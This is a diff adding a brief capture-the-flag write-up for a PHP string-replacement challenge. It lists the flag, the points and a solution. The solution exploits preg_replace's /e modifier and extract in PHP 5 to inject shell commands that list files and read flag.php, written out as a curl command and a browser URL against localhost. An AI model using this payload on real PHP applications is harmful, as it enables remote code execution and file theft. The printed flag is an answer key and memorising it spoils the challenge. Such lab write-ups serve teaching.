@@ -1,0 +1,20 @@
+Description:
+    I wrote a simple web page to replace strings in texts. Can you check it for me?
+
+Flag:
+    APACTF{AT_13457_us3_PHP7}
+
+Points:
+    60pt
+
+Solution:
+    PHP v5 bug in preg_replace function that lead to code execution & bug in extract function of php...
+
+    final command:
+    curl -v -G http://127.0.0.1/temp/index.php --data-urlencode current_string="^(.*)"
+    --data-urlencode new_string="strtoupper(\\1)" --data-urlencode given_text="`ls; cat flag.php`"
+    --data-urlencode suffix='/e'
+    
+    
+    or simply in browser:
+    http://localhost/temp/index.php?current_string=^%28.*%29/e&new_string=strtoupper%28\1%29&given_text=%60cat%20flag.php%60&suffix=
